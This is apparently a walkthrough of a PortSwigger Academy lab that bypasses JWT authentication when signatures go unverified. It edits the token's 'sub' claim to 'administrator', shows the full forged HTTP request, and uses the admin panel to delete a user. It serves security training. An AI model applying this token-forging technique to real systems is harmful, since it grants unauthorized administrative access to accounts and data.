---
title: "PortSwigger Academy — JWT authentication bypass via unverified signature (Web) Walkthrough"
---
# JWT authentication bypass via unverified signature

```
❓

This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.

To solve the lab, modify your session token to gain access to the admin panel at `/admin`, then delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`
```

```
⚠️

We recommend familiarizing yourself with [how to work with JWTs in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts) before attempting this lab.
```

Before starting this lab if you have not done so already, download the JWT Editor plugin from the BApp Store under the extensions tab in Burp Suite, or you can use [JWT.io](https://jwt.io). to follow along.

![image-01.png](image-01.png)

 Let’s start off with logging in with the credentials provided `wiener:peter`, with the JWT Editor active, all requests that contain JWT’s will now be highlighted green there will also be a “JSON Web Token” tab available now in the request and response windows.

![image-02.png](image-02.png)

Send the request over to Repeater so that we can alter the request and it’s JWT, first remove `?id=wiener` from the URL query, then under the “JSON Web Token” tab change the `sub` from “Wiener” to “administrator” and send the request.

```javascript
GET /my-account HTTP/2
Host: 0a0d00c3030747d880d22bcc00f700bf.web-security-academy.net
Cookie: session=eyJraWQiOiI5MmU0OGJlNS0zOTI0LTQ4NmEtYjYxNC02MWM5MGJhN2VjOTIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczMzM4NzQ0MCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.Qcf0SpN7np8-JqSoQePbtddd2OZuN1yXgfxOrzOWRUKA1jbZRGdNBo2xYhvfSOtYMP9X1ZO4wm8PMtPsD-gOrBuDW6uzx-TTcJ72ods9oFt6fHCErdJttXjPwoo-OEj9F5cynQoTosnyBsmsuPZiYtJG5OC4N2YMmOlNLH0nRSubeQXMU7pUlIiMh8n22kDyEjNFuxXrxoZXo6k08ucJnIScxh07AwgYui5L0rX0DbkVtz89mdqbrJo-sEnz-RUxgAULY5676xznQu5FwhvyKhRopv-9qgutWcDL7ApKMzMjWdoDEzIkz3fIePkVtHPItbkKmF14Bc-xwseYnv5Dzw
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a0d00c3030747d880d22bcc00f700bf.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

```

![image-03.png](image-03.png)

We should successfully land on the administrator account if we render the response, once we verify that we’ve successfully landed on the admin account, copy your JWT and past it into your browsers cookie

![image-04.png](image-04.png)

After doing so, navigate to `LAB_URL_ID.web-security-academy.net/my-account`, head to `Admin panel` and delete the user `carlos` to complete the lab.

![image-05.png](image-05.png)
